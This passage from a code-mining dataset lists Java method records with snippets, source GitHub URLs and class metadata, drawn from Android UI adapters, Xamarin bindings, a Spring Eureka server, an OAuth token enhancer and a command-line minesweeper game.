public static void main(String[] args) {        SpringApplication.run(EurekaMain7001.class,args);    }", "url": "https://raw.githubusercontent.com/iMine141/springcloud-test/master/cloud-eureka-server7001/src/main/java/com/atguigu/springcloud/EurekaMain7001.java", "stars": "1", "class": {"name": "EurekaMain7001", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "fillWindow", "params": ["int", "CursorWindow"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void fillWindow(int pos, CursorWindow winow) {        mCursor.fillWindow(pos, winow);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/feeds/AnnotatedCrossProcessCursor.java", "stars": "74", "class": {"name": "AnnotatedCrossProcessCursor", "extends": "AnnotatedCursor", "implements": ["CrossProcessCursor"], "modifiers": []}}, {"method_name": "getWindow", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CursorWindow", "snippet": "    public CursorWindow getWindow() {        return mCursor.getWindow();    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/feeds/AnnotatedCrossProcessCursor.java", "stars": "74", "class": {"name": "AnnotatedCrossProcessCursor", "extends": "AnnotatedCursor", "implements": ["CrossProcessCursor"], "modifiers": []}}, {"method_name": "onMove", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onMove(int oldPosition, int newPosition) {        return mCursor.onMove(oldPosition, newPosition);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/feeds/AnnotatedCrossProcessCursor.java", "stars": "74", "class": {"name": "AnnotatedCrossProcessCursor", "extends": "AnnotatedCursor", "implements": ["CrossProcessCursor"], "modifiers": []}}, {"method_name": "pageCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int pageCount() {\t\treturn pages.size();\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "itemsInPage", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "List<Item>", "snippet": "\tprivate List<Item> itemsInPage(int page) {\t\tif (pages.size() > page) {\t\t\treturn pages.get(page).getItems();\t\t}\t\t\treturn Collections.emptyList();\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "view", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "\tpublic View view(int page, int index) {\t\t\t\tLinearLayout layout = new LinearLayout(context);\t\tlayout.setOrientation(LinearLayout.VERTICAL);\t\t\t\tImageView icon = new ImageView(context);\t\tItem item = getItem(page, index);\t\ticon.setImageResource(item.getDrawable());\t\ticon.setPadding(15, 15, 15, 15);\t\t\t\tlayout.addView(icon);\t\t\t\tTextView label = new TextView(context);\t\tlabel.setTag(\"text\");\t\tlabel.setText(item.getName());\t\t\tlabel.setTextColor(Color.BLACK);\t\tlabel.setGravity(Gravity.TOP | Gravity.CENTER_HORIZONTAL);\t\t\tlabel.setLayoutParams(new LayoutParams(LayoutParams.MATCH_PARENT,LayoutParams.WRAP_CONTENT));\t\tlayout.setLayoutParams(new LinearLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT));\t\t\t\t// only set selector on every other page for demo purposes\t\t// if you do not wish to use the selector functionality, simply disregard this code\t\tif(page % 2 == 0) {    \t\tsetViewBackground(layout);    \t\tlayout.setClickable(true);    \t\tlayout.setOnLongClickListener(new OnLongClickListener() {                @Override                public boolean onLongClick(View v) {                    return gridview.onLongClick(v);                }    \t\t});\t\t}\t\tlayout.addView(label);\t\treturn layout;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "setViewBackground", "params": ["LinearLayout"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setViewBackground(LinearLayout layout) {        if (android.os.Build.VERSION.SDK_INT >= 16) {            layout.setBackground(context.getResources().getDrawable(R.drawable.list_selector_holo_light));        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "getItem", "params": ["int", "int"], "throws": null, "modifiers": ["private"], "return_type": "Item", "snippet": "\tprivate Item getItem(int page, int index) {\t\tList<Item> items = itemsInPage(page);\t\treturn items.get(index);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "rowCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int rowCount() {\t\treturn AUTOMATIC;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "columnCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int columnCount() {\t\treturn AUTOMATIC;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "itemCountInPage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int itemCountInPage(int page) {\t\treturn itemsInPage(page).size();\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "printLayout", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void printLayout() {\t\tint i=0;\t\tfor (Page page : pages) {\t\t\tLog.d(\"Page\", Integer.toString(i++));\t\t\t\t\t\tfor (Item item : page.getItems()) {\t\t\t\tLog.d(\"Item\", Long.toString(item.getId()));\t\t\t}\t\t}\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "getPage", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "Page", "snippet": "\tprivate Page getPage(int pageIndex) {\t\treturn pages.get(pageIndex);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "swapItems", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void swapItems(int pageIndex, int itemIndexA, int itemIndexB) {\t\tgetPage(pageIndex).swapItems(itemIndexA, itemIndexB);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "moveItemToPreviousPage", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void moveItemToPreviousPage(int pageIndex, int itemIndex) {\t\tint leftPageIndex = pageIndex-1;\t\tif (leftPageIndex >= 0) {\t\t\tPage startpage = getPage(pageIndex);\t\t\tPage landingPage = getPage(leftPageIndex);\t\t\t\t\t\tItem item = startpage.removeItem(itemIndex);\t\t\tlandingPage.addItem(item);\t\t\t}\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "moveItemToNextPage", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void moveItemToNextPage(int pageIndex, int itemIndex) {\t\tint rightPageIndex = pageIndex+1;\t\tif (rightPageIndex < pageCount()) {\t\t\tPage startpage = getPage(pageIndex);\t\t\tPage landingPage = getPage(rightPageIndex);\t\t\t\t\t\tItem item = startpage.removeItem(itemIndex);\t\t\tlandingPage.addItem(item);\t\t\t\t\t}\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "deleteItem", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void deleteItem(int pageIndex, int itemIndex) {\t\tgetPage(pageIndex).deleteItem(itemIndex);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "deleteDropZoneLocation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int deleteDropZoneLocation() {                return BOTTOM;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "showRemoveDropZone", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean showRemoveDropZone() {        return true;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "getPageWidth", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getPageWidth(int page) {\t\t// TODO Auto-generated method stub\t\treturn 0;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "getItemAt", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object getItemAt(int page, int index) {\t\t// TODO Auto-generated method stub\t\treturn null;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "disableZoomAnimationsOnChangePage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean disableZoomAnimationsOnChangePage() {\t\t// TODO Auto-generated method stub\t\treturn false;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/ExampleActivity/src/ca/laplanete/mobile/example/ExamplePagedDragDropGridAdapter.java", "stars": "74", "class": {"name": "ExamplePagedDragDropGridAdapter", "extends": null, "implements": ["PagedDragDropGridAdapter"], "modifiers": ["public"]}}, {"method_name": "enhance", "params": ["OAuth2AccessToken", "OAuth2Authentication"], "throws": null, "modifiers": ["public"], "return_type": "OAuth2AccessToken", "snippet": "    public OAuth2AccessToken enhance(OAuth2AccessToken accessToken, OAuth2Authentication authentication) {        Map<String, Object> additionalInfo = new HashMap<>();        additionalInfo.put(\"test_data\", \"This is my test data.\");        ((DefaultOAuth2AccessToken) accessToken).setAdditionalInformation(additionalInfo);        return accessToken;    }", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-auth2-service/src/main/java/com/iiht/stock/auth/security/JWTTokenEnhancer.java", "stars": "2", "class": {"name": "JWTTokenEnhancer", "extends": null, "implements": ["TokenEnhancer"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        try(//1.\u521b\u5efa\u4e00\u4e2a\u5b57\u8282\u8f93\u5165\u6d41\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u7ed1\u5b9a\u8981\u8bfb\u53d6\u7684\u6570\u636e\u6e90            FileInputStream fis = new FileInputStream(\"c:\\\\1.jpg\");            //2.\u521b\u5efa\u4e00\u4e2a\u5b57\u8282\u8f93\u51fa\u6d41\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u7ed1\u5b9a\u8981\u5199\u5165\u7684\u76ee\u7684\u5730            FileOutputStream fos = new FileOutputStream(\"d:\\\\1.jpg\");){            //\u53ef\u80fd\u4f1a\u4ea7\u51fa\u5f02\u5e38\u7684\u4ee3\u7801            //\u4e00\u6b21\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5199\u5165\u4e00\u4e2a\u5b57\u8282\u7684\u65b9\u5f0f            //3.\u4f7f\u7528\u5b57\u8282\u8f93\u5165\u6d41\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5read\u8bfb\u53d6\u6587\u4ef6            int len = 0;            while((len = fis.read())!=-1){                //4.\u4f7f\u7528\u5b57\u8282\u8f93\u51fa\u6d41\u4e2d\u7684\u65b9\u6cd5write,\u628a\u8bfb\u53d6\u5230\u7684\u5b57\u8282\u5199\u5165\u5230\u76ee\u7684\u5730\u7684\u6587\u4ef6\u4e2d                fos.write(len);            }        }catch (IOException e){            //\u5f02\u5e38\u7684\u5904\u7406\u903b\u8f91            System.out.println(e);        }    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/16.%E3%80%90%E5%BC%82%E5%B8%B8%E3%80%81%E7%BA%BF%E7%A8%8B%E3%80%91-%E7%AC%94%E8%AE%B0/20.%E3%80%90%E5%AD%97%E8%8A%82%E6%B5%81%E3%80%81%E5%AD%97%E7%AC%A6%E6%B5%81%E3%80%91-%E7%AC%94%E8%AE%B0/code/09_IOAndProperties/src/com/itheima/demo06/trycatch/Demo02JDK7.java", "stars": "2", "class": {"name": "Demo02JDK7", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onTouchEvent", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\t{\t\treturn n_onTouchEvent (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onTouchEvent", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onTouchEvent (android.view.MotionEvent p0);\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\t{\t\tn_onLayout (p0, p1, p2, p3, p4);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\t{\t\tn_onLayout (p0, p1, p2, p3, p4);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\tpublic void onViewAttachedToWindow (android.view.View p0)\t{\t\tn_onViewAttachedToWindow (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onViewAttachedToWindow", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onViewAttachedToWindow (android.view.View p0)\t{\t\tn_onViewAttachedToWindow (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onViewAttachedToWindow", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onViewAttachedToWindow (android.view.View p0);\tpublic void onViewDetachedFromWindow (android.view.View p0)\t{\t\tn_onViewDetachedFromWindow (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onViewDetachedFromWindow", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onViewDetachedFromWindow (android.view.View p0)\t{\t\tn_onViewDetachedFromWindow (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onViewDetachedFromWindow", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onViewDetachedFromWindow (android.view.View p0);\tpublic void onFocusChange (android.view.View p0, boolean p1)\t{\t\tn_onFocusChange (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onFocusChange", "params": ["android", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onFocusChange (android.view.View p0, boolean p1)\t{\t\tn_onFocusChange (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onFocusChange", "params": ["android", "boolean"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onFocusChange (android.view.View p0, boolean p1);\tpublic void onClick (android.view.View p0)\t{\t\tn_onClick (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onClick (android.view.View p0)\t{\t\tn_onClick (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onClick", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onClick (android.view.View p0);\tpublic boolean onTouch (android.view.View p0, android.view.MotionEvent p1)\t{\t\treturn n_onTouch (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onTouch", "params": ["android", "android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onTouch (android.view.View p0, android.view.MotionEvent p1)\t{\t\treturn n_onTouch (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onTouch", "params": ["android", "android"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onTouch (android.view.View p0, android.view.MotionEvent p1);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64ee486da937c010f4/ButtonRenderer.java", "stars": "2", "class": {"name": "ButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void init() {\t\tinput = new Scanner(System.in); //init scanner\t\tJMinesCliIntro.play(); //play game intro\t\t\t\tString currInput; //to store user input\t\tint dim = -1; //to store chosen dimensions\t\tint diff = -1; //to store chosen difficulty\t\t\t\t//ask for dimensions\t\tdo {\t\t\tSystem.out.print(\"Board size [5-10]: \");\t\t\tcurrInput = input.nextLine();\t\t\tif (currInput.matches(\"([5-9]|10)\")) {\t\t\t\tdim = Integer.parseInt(currInput);\t\t\t}\t\t} while (dim == -1);\t\t\t\t//ask for difficulty\t\tdo {\t\t\tSystem.out.print(\"Difficulty [1-10]: \");\t\t\tcurrInput = input.nextLine();\t\t\tif (currInput.matches(\"([1-9]|10)\")) {\t\t\t\tdiff = Integer.parseInt(currInput);\t\t\t}\t\t} while (diff == -1);\t\t\t\t//start new game, draw game state!\t\tdraw(newGame.call(dim, diff));\t\t\t\t//ask for command\t\tdo {\t\t\tSystem.out.print(\"\\n[r]eveal or [m]ark: \");\t\t\tString cmd = input.nextLine().replaceAll(\"\\\\s\", \"\").toLowerCase();\t\t\tif (!isValidCmd(cmd)) continue;\t\t\tchar[] cmdsplit = cmd.toCharArray();\t\t\tchar c = cmdsplit[0];\t\t\tint x = Integer.parseInt(cmdsplit[1] + \"\");\t\t\tint y = Integer.parseInt(cmdsplit[2] + \"\");\t\t\tif (c == 'r') {\t\t\t\tdraw(reveal.call(x, y));\t\t\t} else {\t\t\t\tdraw(mark.call(x, y));\t\t\t}\t\t} while (true);\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/ui/cli/JMinesCli.java", "stars": "1", "class": {"name": "JMinesCli", "extends": null, "implements": ["JMinesUi"], "modifiers": ["public"]}}, {"method_name": "isValidCmd", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "\tprivate boolean isValidCmd(String cmd) {\t\treturn cmd.matches(\"[rm]\\\\d{2}.*\");\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/ui/cli/JMinesCli.java", "stars": "1", "class": {"name": "JMinesCli", "extends": null, "implements": ["JMinesUi"], "modifiers": ["public"]}}, {"method_name": "draw", "params": ["GameState"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void draw(GameState state) {\t\t//clear screen\t\tcls();\t\t\t\tCell[][] board = state.getBoard();\t\t\t\t//print board with koordinates\t\tSystem.out.print(\"   \");\t\t\t\tfor (int i = 0; i < board.length; i++)\t\t\tSystem.out.print(\" \" + i);\t\t\t\tSystem.out.println();\t\tSystem.out.print(\"  +-\");\t\t\t\tfor (int i = 0; i < board.length; i++)\t\t\tSystem.out.print(\"--\");\t\tSystem.out.print(\"+\");\t\tSystem.out.println();\t\t\t\tfor (int y = 0; y < board.length; y++) {\t\t\tSystem.out.print(y + \" |\");\t\t\tfor (int x = 0; x < board[y].length; x++) {\t\t\t\tSystem.out.print(\" \" + board[x][y]);\t\t\t}\t\t\tSystem.out.print(\" |\");\t\t\tSystem.out.println();\t\t}\t\t\t\tSystem.out.print(\"  +-\");\t\t\t\tfor (int i = 0; i < board.length; i++)\t\t\tSystem.out.print(\"--\");\t\t\t\tSystem.out.print(\"+\");\t\t\t\tif (state.isLost()) {\t\t\tSystem.out.println(\"YOU LOST!\");\t\t} else if (state.isWon()) {\t\t\tSystem.out.println(\"YOU WON!\");\t\t}\t}", "url": 